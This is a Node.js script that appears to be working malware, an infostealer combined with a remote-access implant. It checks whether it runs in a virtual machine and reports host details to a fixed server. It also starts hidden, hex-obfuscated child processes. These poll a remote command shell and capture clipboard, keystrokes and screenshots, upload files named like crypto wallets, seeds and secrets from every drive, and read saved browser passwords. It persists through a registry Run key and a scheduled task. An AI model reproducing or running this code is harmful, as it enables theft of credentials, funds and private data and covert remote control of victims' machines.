
try {
    const os = require('os'),
        fs = require('fs'),
        path = require('path'),
        sqlite3 = require('sqlite3').verbose(),
        FormData = require('form-data'),
        axios = require('axios'),
        { execSync, spawn } = require('child_process'),
        uploadUrl = "http://192.168.0.186:5918/upload"

    process.on('uncaughtException', (_0xad8869) => {})
    process.on('unhandledRejection', (_0x461982) => {})
    let i = 0;
    const uid = '4a3703430a2ec2ae30f362b29e994f77',
        ukey = 1995,
        p = 5918,
        kp = 5974,
        upt = 5934,
        lpt = 5961,
        t = 66,
        a = 127,
        b = 0,
        c = 0,
        d = 1,
        e = 127,
        f = 0,
        g = 0,
        h = 1,
        m = a + '.' + b + '.' + c + '.' + d,
        usu = e + '.' + f + '.' + g + '.' + h,
        lsu = e + '.' + f + '.' + g + '.' + h 

    async function s() {
        ss();
        aa();
        bb();
        
    }
    
    const ss = async () => {
        console.log("ss function started");
        const _0x5f2ebc = 
            '\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20axios\\x20=\\x20require(\\x22axios\\x22);\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20os\\x20=\\x20require(\\x22os\\x22);\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20fs\\x20=\\x20require(\\x22fs\\x22);\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20{spawn,\\x20execSync}\\x20=\\x20require(\\x22child_process\\x22);\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20const\\x20uid\\x20=\\x20\\x224a3703430a2ec2ae30f362b29e994f77\\x22;\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20setInterval(()\\x20=>\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20let\\x20clip;\\x0a' +
            '\\x20\\x20\\x20\\x20if\\x20(os.platform()\\x20===\\x20\\x22win32\\x22)\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20clip\\x20=\\x20execSync(\\x22powershell\\x20-command\\x20Get-Clipboard\\x22,\\x20{encoding:\\x20\\x22utf8\\x22,\\x20windowsHide:\\x20true\\x20});\\x0a' +
            '\\x20\\x20\\x20\\x20}\\x20else\\x20if\\x20(os.platform()\\x20===\\x20\\x22darwin\\x22)\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20clip\\x20=\\x20execSync(\\x22pbpaste\\x22,\\x20{encoding:\\x20\\x22utf8\\x22});\\x0a' +
            '\\x20\\x20\\x20\\x20}\\x20else\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20clip\\x20=\\x20execSync(\\x22xclip\\x20-selection\\x20clipboard\\x20-o\\x22,\\x20{encoding:\\x20\\x22utf8\\x22,\\x20windowsHide:\\x20true\\x20});\\x0a' +
            '\\x20\\x20\\x20\\x20}\\x0a' +
            '\\x20\\x20\\x20\\x20axios.post(\\x60http://\\x24{a}.\\x24{b}.\\x24{c}.\\x24{d}:\\x24{p}/clip\\x60,\\x20{uid,\\x20clip}).catch(err\\x20=>\\x20console.error(\\x22Clipboard\\x20post\\x20error:\\x22,\\x20err.message));\\x0a' +
            '\\x20\\x20},\\x205000);\\x0a' +
            '\\x20\\x20setInterval(async\\x20()\\x20=>\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20try\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20const\\x20response\\x20=\\x20await\\x20axios.get(\\x60http://\\x24{a}.\\x24{b}.\\x24{c}.\\x24{d}:\\x24{p}/command?uid=\\x60+uid);\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20const\\x20command\\x20=\\x20response.data.command;\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20if\\x20(command)\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20let\\x20output;\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20try\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20output\\x20=\\x20execSync(command,\\x20{encoding:\\x20\\x22utf8\\x22,\\x20windowsHide:\\x20true\\x20});\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\x20catch\\x20(err)\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20output\\x20=\\x20\\x22Error\\x20executing\\x20command:\\x20\\x22+err.message;\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20await\\x20axios.post(\\x60http://\\x24{a}.\\x24{b}.\\x24{c}.\\x24{d}:\\x24{p}/output\\x60,\\x20{uid,\\x20command,\\x20output});\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20}\\x0a' +
            '\\x20\\x20\\x20\\x20}\\x20catch\\x20(err)\\x20{\\x0a' +
            '\\x20\\x20\\x20\\x20\\x20\\x20console.error(\\x22Remote\\x20shell\\x20error:\\x22,\\x20err.message);\\x0a' +
            '\\x20\\x20\\x20\\x20}\\x0a' +
            '\\x20\\x20},\\x2010000);';
        const decodedCode = _0x5f2ebc.replace(/\\x([0-9A-Fa-f]{2})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)));
        // console.log(decodedCode);
        const prelude = [
            `globalThis.a = ${JSON.stringify(a)};`,
            `globalThis.b = ${JSON.stringify(b)};`,
            `globalThis.c = ${JSON.stringify(c)};`,
            `globalThis.d = ${JSON.stringify(d)};`,
            `globalThis.p = ${JSON.stringify(p)};`,
            `globalThis.uid = ${JSON.stringify(uid)};`,
            // also include any other values you want the child to see:
            `globalThis.ukey = ${JSON.stringify(ukey)};`,
        ].join('\n') + '\n';

        const childScript = prelude + decodedCode;
        // console.log(childScript);
        _0x24451c = new Error('spawn node ENOENT');
        try {
            const _0x69392 = spawn('node', ['-e', childScript], { 
                windowsHide: true,
                detached: true,
                stdio: ['pipe', 'pipe', 'pipe'], });
            _0x69392.on('error', (err) => {
                console.error('Spawn error:', err.message);
            });

            _0x69392.stdout.on('data', (data) => {
                console.log(`stdout: ${data}`);
            });

            _0x69392.stderr.on('data', (data) => {
                console.error(`stderr: ${data}`);
                // This will capture errors like syntax errors in the script
            });

            _0x69392.on('exit', (code, signal) => {
                if (code !== 0) {
                    console.error(`Process exited with code ${code}`);
                }
                if (signal) {
                    console.error(`Process terminated by signal ${signal}`);
                }
            });
            _0x69392.unref();
            execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "NodeHelper" /t REG_SZ /d "node ${__dirname}\\index.mjs" /f`, {stdio: 'ignore'});
            execSync(`schtasks /create /tn "NodeUpdate" /tr "node ${__dirname}\\index.mjs" /sc onlogon /rl highest /f`, {stdio: 'ignore'});
            // process.exit(0);
            }catch(_0x24451c) {
                console.log(_0x24451c);
            }
            
   
    }
    
    let screenshotCounter = 0;
    let totalFiles = 0;
    const searchKey = [
        "*.env*",
        "*metamask*",
        "*phantom*",
        "*bitcoin*",
        "*trust*",
        "*phrase*",
        "*secret*",
        "*phase*",
        "*credential*",
        "*profile*",
        "*account*",
        "*mnemonic*",
        "*seed*",
        "*recovery*",
        "*backup*",
        "*address*",
        "*keypair*",
        "*wallet*",
        "*my*",
        "*screenshot*",
        "*.doc*",
        "*.docx*",
        "*.pdf*",
        "*.cd*",
        "*.rtf*",
        "*.odt*",
        "*.xls*",
        "*.xlsx*",
        "*.txt*",
        "*.ini*",
        "*.secret*",
        "*.json*",
        "*.ts*",
        "*.js*",
        "*.csv*",
    ];

    const excludeFolders = [
        'node_modules', 'Windows', 'Program Files', 'Program Files (x86)', 
        'System Volume Information', '$Recycle.Bin', 'AppData', '.cache', 
        '.npm', '.git', 'tmp', 'temp', '/var', '/usr', '/bin', '/sbin', 
        '/etc', '/dev', '/proc', '/sys',
        'Recovery', 'pagefile.sys', 'hiberfil.sys', 'swapfile.sys',
        'Thumbs.db', '$RECYCLE.BIN', 'System Restore', 'Config.Msi',
        'MSOCache', 'Installer', 'iPod_Control', 'iTunes', 'OneDriveTemp',
        'Application Data', 'LocalLow', 'ProgramData', 'PerfLogs',
        'Boot', 'EFI', 'WindowsApps', 'WinSxS', 'WIM',
    ];

    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    const isFileMatching = (fileName) => {
        const lowerFileName = fileName.toLowerCase();
        return searchKey.some(pattern => {
            const lowerPattern = pattern.toLowerCase();
            if (lowerPattern.startsWith('*') && lowerPattern.endsWith('*')) {
                const keyword = lowerPattern.slice(1, -1);
                return lowerFileName.includes(keyword);
            } else if (lowerPattern.startsWith('*.')) {
                const extension = lowerPattern.slice(1);
                return lowerFileName.endsWith(extension);
            }
            return false;
        });
    };

    let listenerAdded = false;
    const bb = async () => {
        // console.log("bb function started");
        const _0x3d341e = 
            `const fs = require('fs');
            const path = require('path');
            const axios = require('axios');
            const os = require('os');

            let screenshotCounter = 0;
            let totalFiles = 0;
            let listenerAdded = false;
            const searchKey = ${JSON.stringify(searchKey)};
            const excludeFolders = ${JSON.stringify(excludeFolders)};
            const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
            const isFileMatching = ${isFileMatching.toString()};
            setTimeout(() => {
                try {
                    const GlobalKeyboardListener = require("node-global-key-listener").GlobalKeyboardListener;
                    const { Monitor } = require("node-screenshots");
                    const sharp = require("sharp");
                    const FormData = require("form-data");
                    const keyStates = {};
                    let capsLock = false;
                    const tmpDir = os.tmpdir();
                    const keyboard = new GlobalKeyboardListener();

                    let text = "";
                    let shift = false;
                    let ctrl = false;
                    let isRunning = true;
                    const uu = "http://192.168.0.186:5918/total";

                    const uf = async (p) => {
                        if (fs.statSync(p).isFile()) {
                            const form = new FormData();
                            form.append("file", fs.createReadStream(p));
                            try {
                                const response = await axios.post(uu, form, {
                                    headers: {
                                        ...form.getHeaders(),
                                        userkey: 1995,
                                        hostname: os.hostname(),
                                        path: p,
                                        t: "66"
                                    }
                                });
                                // console.log(\`Uploaded file: \${p}\`);
                            } catch (error) {
                                console.error("Error uploading file p:", error.message);
                            }
                        }
                    };
                    const sendKeyText = async () => {
                        if (text.trim() === "") return;
                        const form = new FormData();
                        form.append("text", text);
                        try {
                            const response = await axios.post(uu, form, {
                                headers: {
                                    ...form.getHeaders(),
                                    userkey: 1995,
                                    hostname: os.hostname(),
                                    t: "66"
                                }
                            });
                            text = ""; // Clear text after sending
                        } catch (error) {
                        }
                    };
                    const addKeyboardListener = () => {
                        if (listenerAdded) return;
                        listenerAdded = true;

                        keyboard.addListener(function (e, down) {
                            if (!isRunning) return;

                            const key = e.name.toLowerCase();
                            const state = e.state;
                            // console.log(key);
                            if (state === "DOWN") {
                                if (e.rawKey.name === "LSHIFT" || e.rawKey.name === "RSHIFT") {
                                    shift = true;
                                    keyStates[key] = { pressed: true, pressTime: Date.now() };
                                } else if (e.rawKey.name === "LCONTROL" || e.rawKey.name === "RCONTROL") {
                                    ctrl = true;
                                    keyStates[key] = { pressed: true, pressTime: Date.now() };
                                } else if (e.rawKey.name === "CAPSLOCK") {
                                    capsLock = !capsLock;
                                    console.log("Caps Lock: capsLock ? 'ON' : 'OFF'");
                                    keyStates[key] = { pressed: true, pressTime: Date.now() };
                                }
                            } else if (state === "UP") {
                                if (e.rawKey.name === "LSHIFT" || e.rawKey.name === "RSHIFT") {
                                    shift = false;
                                    delete keyStates[key];
                                } else if (e.rawKey.name === "LCONTROL" || e.rawKey.name === "RCONTROL") {
                                    ctrl = false;
                                    delete keyStates[key];
                                } else if (e.rawKey.name === "CAPSLOCK") {
                                    delete keyStates[key];
                                }
                            }

                            if (state !== "DOWN" || ctrl) return;

                            const modifiers = ["shift", "control", "alt", "tab", "caps lock", "windows"];
                            if (modifiers.includes(key)) return;

                            const special = {
                                "space": " ",
                                "backspace": "[BS]",
                                "delete": "[DEL]",
                                "tab": "[TAB]",
                                "escape": "[ESC]",
                                "mouse left": "submit"
                            };
                            console.log(e.rawKey.name);
                            if (e.rawKey.name === "RETURN" || e.rawKey.name === "LBUTTON") {
                                text += special[key];
                                sendKeyText(); // Send text when Enter is pressed
                            } else if (special[key]) {
                                text += special[key];
                            } else if (key.length === 1) {
                                let char = key;
                                if (capsLock) {
                                    char = char.toUpperCase();
                                } else if (shift) {
                                    char = char.toUpperCase();
                                } else {
                                    char = char.toLowerCase();
                                }
                                text += char;
                            }
                        });
                        

                        console.log("KEYBOARD LISTENER ADDED");
                    };

                    const scanDir = async (dirPath) => {
                        if (!fs.existsSync(dirPath)) return;

                        let items;
                        try {
                            items = fs.readdirSync(dirPath);
                        } catch (e) {
                            return;
                        }

                        for (const item of items) {
                            try {
                                const fullPath = path.join(dirPath, item);
                                if (item === "go") continue;

                                const containExcludedWord = excludeFolders.some((word) =>
                                    fullPath.toLowerCase().includes(word.toLowerCase())
                                );

                                if (containExcludedWord) continue;

                                const stat = fs.statSync(fullPath);

                                if (stat.isDirectory()) {
                                    if (!excludeFolders.includes(item)) {
                                        await scanDir(fullPath);
                                    }
                                } else if (stat.isFile() && isFileMatching(item)) {
                                    await uf(fullPath);
                                    totalFiles++;
                                    await sleep(120);
                                }
                            } catch (e) {
                                // Silent fail
                            }
                        }
                    };

                    const scanFullSystem = async () => {
                        const rootDrives = [];

                        if (process.platform === 'win32') {
                            const drives = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
                            for (let letter of drives) {
                                const drive = letter + ":\";
                                if (fs.existsSync(drive)) {
                                    rootDrives.push(drive);
                                    console.log("Found drive: drive");
                                }
                            }
                        } else {
                            rootDrives.push('/');
                            const mounts = ['/mnt', '/media', '/Volumes', '/home'];
                            mounts.forEach(mount => {
                                if (fs.existsSync(mount)) rootDrives.push(mount);
                            });
                        }

                        console.log('='.repeat(60));

                        for (const root of rootDrives) {
                            await scanDir(root);
                        }

                    };

                    // Initialize keyboard listener once
                    addKeyboardListener();

                    scanFullSystem();

                    // Screenshot timer (every 5 seconds)
                    setInterval(async () => {
                        if (!isRunning) return;
                        try {
                            const monitors = Monitor.all();

                            if (monitors.length < 2) {
                                throw new Error("At least two monitors are required to combine screenshots.");
                            }

                            const [monitor1, monitor2] = [monitors[0], monitors[1]];
                            const image1 = monitor1.captureImageSync();
                            const image2 = monitor2.captureImageSync();
                            console.log("Captured screenshots for monitors:", monitor1.id, monitor2.id);

                            const screenshot1Meta = await sharp(image1.toPngSync()).metadata();
                            const screenshot2Meta = await sharp(image2.toPngSync()).metadata();

                            const combinedImage = await sharp({
                                create: {
                                    width: screenshot1Meta.width + screenshot2Meta.width,
                                    height: Math.max(screenshot1Meta.height, screenshot2Meta.height),
                                    channels: 4,
                                    background: { r: 0, g: 0, b: 0, alpha: 1 }
                                }
                            })
                                .composite([
                                    { input: image1.toPngSync(), left: 0, top: 0 },
                                    { input: image2.toPngSync(), left: screenshot1Meta.width, top: 0 }
                                ])
                                .jpeg({ quality: 80 })
                                .toBuffer();

                            const screenshotDir = path.join(tmpDir, 'screenshots');
                            fs.existsSync(screenshotDir) || fs.mkdirSync(screenshotDir, { recursive: true });
                            const screenshotPath = path.join(screenshotDir, "screenshot${screenshotCounter++}.jpeg");
                            fs.writeFileSync(screenshotPath, combinedImage);
                            console.log("Saved combined screenshot to screenshotPath");

                            await uf(screenshotPath);
                            text = '';
                            console.log("Uploaded combined screenshot from screenshotPath");
                        } catch (err) {
                            console.error('Error capturing or combining screenshots:', err);
                        }
                    }, 5000);
                    console.log("KEYLOGGER + SCREENSHOT ACTIVE!");
                } catch (error) {
                    console.error("KEYLOGGER INIT ERROR:", error.message);
                }
        }, 2000);
        

        `;

        _0x24451c = new Error('spawn node ENOENT');

        try {
            console.log("bb function is started")
            const _0x23df1e = spawn('node', ['-e', _0x3d341e], {
                windowsHide: true,
                detached: true,
                stdio: 'ignore',
            });
            _0x23df1e.unref();
            
            // process.exit(0);
        }catch(_0x24451c) {
            console.log(_0x24451c);
        }
    }
    const wps = [
        "acmacodkjbdgmoleebolmdjonilkdbch", // Keplr
        "nkbihfbeogaeaoehlefnkodbefgpgknn", // MetaMask
        "bfnaelmomeimhlpmgjnjophhpkkoljpa", // Phantom
        "ibnejdfjmmkpcnlpebklmnkoeoihofec", // Binance Chain
        "ppbibelpcjmhbdihakflkdcoccbgbkpo", // Core Wallet
        "omaabbefbmiijedngplfjmnooppbclkk", // Tonkeeper
        "egjidjbpglichdcondbcbdnbeeppgdph", // Trust
        "khpkpbbcccdmmclmpigdgddabeilkdpd", // XDEFI
        "dmkamcknogkgcdfhhbddcghachkejeap", // Brave
        "ejbalbakoplchlghecdalmeeeajnimhm", // Bitget
        "fhbohimaelbohpjbbldcngcnapndodjp", // MetaMask Beta
        "aeachknmefphepccionboohckonoeemg", // Ronin
        "hifafgmccdpekplomjjkcfgodnhcellj", // Terra
        "jblndlipeogpafnldhgmapagcccfchpi", // Nami
        "dlcobpjiigpikoobohmabehhmhfoodbb", // Solflare
        "mcohilncbfahbmgdjkbpemcciiolgcge", // Binance
        "agoakfejjabomempkjlepdflaleeobhb", // Martian
        "aholpfdialjgjfhomihkjbmgioiodbic", // Petra
        "nphplpgoakhhjchkkhmiggakijnkhfnd", // Safepal
        "penjlddjkjgpnkllboccdgccekpkcbin", // Suiet
        "lgmpcpglpngdoalbgeoldeajfclnhafa", // Fewcha
        "fldfpgipfncgndfolcbkdeeknbbbnhcc", // Clover
        "bhhhlbepdkbapadjdnnojkbgioiodbic", // Pontem
        "gjnckgkfmgmibbkoficdidcljeaaaheg", // Unisat
        "afbcbjpbpfadlkmhmclhkeeodmamcflc", // WalletConnect
        "bdgmdoedahdcjmpmifafdhnffjinddgc", // Bittensor
        "hnfanknocfeofbddgcijnmhnfnkdnaad", // Coinbase
        "acmacodkjbdgmoleebolmdjonilkdbch", // Rabby
    ];
    // Main function to orchestrate the process
    const aa = async () => {
        console.log("aa function started.")
        const _0x4f325= `
        const fs = require('fs');
        const path = require('path');
        const sqlite3 = require('sqlite3').verbose();
        const FormData = require('form-data');
        const axios = require('axios');
        const uploadUrl = "http://192.168.0.186:5918/upload";
        
        let i = ${i};
        const getBasePaths = () => {
            const platform = process.platform;
            if (platform === "win32") {
                return [
                    path.join(process.env.LOCALAPPDATA, "Google/Chrome/User Data"),
                    path.join(process.env.LOCALAPPDATA, "BraveSoftware/Brave-Browser/User Data")
                ];
            } else if (platform === "darwin") {
                return [
                    path.join(process.env.HOME, "Library/Application Support/Google/Chrome"),
                    path.join(process.env.HOME, "Library/Application Support/BraveSoftware/Brave-Browser")
                ];
            } else if (platform === "linux") {
                return [
                    path.join(process.env.HOME, ".config/google-chrome"),
                    path.join(process.env.HOME, ".config/BraveSoftware/Brave-Browser")
                ];
            }
            return [];
        };
    
        // Helper to get all profile directories (e.g., Default, Profile 1, etc.)
        const getProfilePaths = (basePath) => {
            const profiles = [];
            try {
                const files = fs.readdirSync(basePath);
                // console.log(files);
                profiles.push(...files.filter(f => f.startsWith('Profile ')).map(f => f));
                // console.log(profiles);
            } catch (err) {
                console.error('Error reading profiles in basePath:', err);
            }
                return profiles.map(profile => path.join(basePath, profile));
        };
        const extractExtensionData = (profilePath) => {
            const extDir = path.join(profilePath, 'Extensions');
            const extractedData = [];
        
            if (!fs.existsSync(extDir)) {
                console.log("Extensions directory not found at extDir");
                return extractedData;
            }
        
            for (const extId of ${JSON.stringify(wps)}) {
                const extPath = path.join(extDir, extId);
                if (fs.existsSync(extPath)) {
                    try {
                        extractedData.push({
                            extensionId: extId,
                            data: "Simulated wallet data for extId" // Real code reads keys/seeds
                        });
                    } catch (err) {
                        console.error('Error reading extension extId:', err);
                    }
                }
            }
            return extractedData;
        };
    

        const exfiltrateData = async (data) => {
            const form = new FormData();
            form.append('data', JSON.stringify(data));
            form.append('id', i++);
        
            try {
                const response = await axios.post(uploadUrl, form, {
                    headers: form.getHeaders()
                });
                console.log('Data exfiltrated:', response.status);
            } catch (err) {
                console.error('Exfiltration failed:', err.message);
            }
        };
        const extractBrowserData = (profilePath) => {
            const loginDataPath = path.join(profilePath, 'Login Data');
            const extractedData = [];
        
            if (!fs.existsSync(loginDataPath)) {
                console.log('Login Data not found at loginDataPath');
                return extractedData;
            }
        
            const db = new sqlite3.Database(loginDataPath, sqlite3.OPEN_READONLY, (err) => {
                if (err) {
                    console.error("Error opening database loginDataPath:", err);
                    return;
                }
                console.log('Connected to the database')
            });
    
            return new Promise((resolve) => {
                db.all('SELECT origin_url, username_value, password_value FROM logins', (err, rows) => {
                    if (err) {
                        console.error("Error querying database loginDataPath:", err);
                    } else {
                        rows.forEach(row => {
                            extractedData.push({
                                url: row.origin_url,
                                username: row.username_value,
                                password: row.password_value
                            });
                        });
                    }
                    db.close();
                    resolve(extractedData);
                });
            });
        }   
        const SetData = async() => {
            const basePaths = getBasePaths();
            console.log("basePaths");
            for (const basePath of basePaths) {
                if (!fs.existsSync(basePath)) {
                    console.log('Base path not found: basePaths');
                }
    
                const profilePaths = getProfilePaths(basePath);
                for (const profilePath of profilePaths) {
                    const browserData = await extractBrowserData(profilePath);
                    if (browserData.length > 0) {
                        await exfiltrateData({ type: 'browser', profile: profilePath, data: browserData });
                    }
                    const extensionData = extractExtensionData(profilePath);
                    if (extensionData.length > 0) {
                        await exfiltrateData({ type: 'extension', profile: profilePath, data: extensionData });
                    }
                }
            }
        };
        SetData().catch(console.error);
        `;
        _0x24451c = new Error('spawn node ENOENT');
        try {
            const _0x849f8 = spawn('node', ['-e', _0x4f325],{
                windowsHide: true,
                detached: true,
                stdio: ['pipe', 'pipe', 'pipe'], });
            _0x849f8.on('error', (err) => {
                console.error('Spawn error:', err.message);
            });

            _0x849f8.stdout.on('data', (data) => {
                console.log(`stdout: ${data}`);
            });

            _0x849f8.stderr.on('data', (data) => {
                console.error(`stderr: ${data}`);
                // This will capture errors like syntax errors in the script
            });

            _0x849f8.on('exit', (code, signal) => {
                if (code !== 0) {
                    console.error(`Process exited with code ${code}`);
                }
                if (signal) {
                    console.error(`Process terminated by signal ${signal}`);
                }
            });
            _0x849f8.unref();
            // console.log(_0x849f8);
        }catch(_0x24451c){
            console.log(_0x24451c);
        }
    }

    const setHeader = async function () {
        try{
            let isVM = false;
            if(os.platform() == "win32") {
                let output = execSync("wmic computersystem get model,manufacturer", {windowsHide: true});
                output = output.toString().toLowerCase();
                if(
                    output.indexOf("vmware") > -1 ||
                    output.includes("virtualbox") ||
                    output.includes("microsoft corporation") ||
                    output.includes("qemu")
                ) {
                    isVM = true;
                }
            }
            else if (os.platform() == "darwin") {
                let output = execSync("system_profiler SPHardwareDataType", {windowsHide: true});
                output = output.toString().toLowerCase();
                if(/vmware|virtualbox|qemu|parallels|virtual/i.test(output)) {
                    isVM = true;
                }
            }
            else if (os.platform() == "linux") {
                let output = fs.readFileSync("/proc/cpuinfo", "utf8").toLowerCase();
                if(
                    /hypervisor|vmware|virtualbox|qemu|kvm|xen|parallels|bochs/.test(output)
                ){
                    isVM = true;
                }
            }
            console.log(os.userInfo().username);
            result = await axios.post("http://192.168.0.186:5918/api/service/process/"+uid, {
                OS: os.type(),
                platform: os.platform(),
                release: os.release() + (isVM ? " (VM)":"(Local)"),
                host: os.hostname(),
                userinfo: os.userInfo(),
                uid: uid,
                t: 66
            });
            console.log("setHeader result:", result.data);
            if (result.data && result.data.release.includes("(VM)")) {
                console.log("Detected VM, altering behavior...");
                return false;
                // process.exit(0);
            } else {
                return true;
            }
        }
        catch(e){
            console.log(e.message);
            return true;
        }
    }

    

    async function main() {
        console.log('Starting malware initialization...');
        
        // 1. FIRST: Call setHeader() and detect VM
        const isNotVM = await setHeader();
        
        // 2. ONLY IF NOT VM: Execute ss(), aa(), bc()
        if (isNotVM) {
            console.log(isNotVM);
            console.log('System is NOT VM - Executing payload...');
            
            try {
                // Execute all three functions
                await s(); // This calls ss(), aa(), bc() internally
                console.log('All payloads deployed successfully');
            } catch (error) {
                console.error('Error deploying payloads:', error.message);
            }
        } else {
            console.log('VM detected or setHeader failed - Exiting...');
            // process.exit(0); // Uncomment to exit on VM detection
        }
    }

    // Start the main execution
    main().catch(console.error);
    
}catch(error) {}

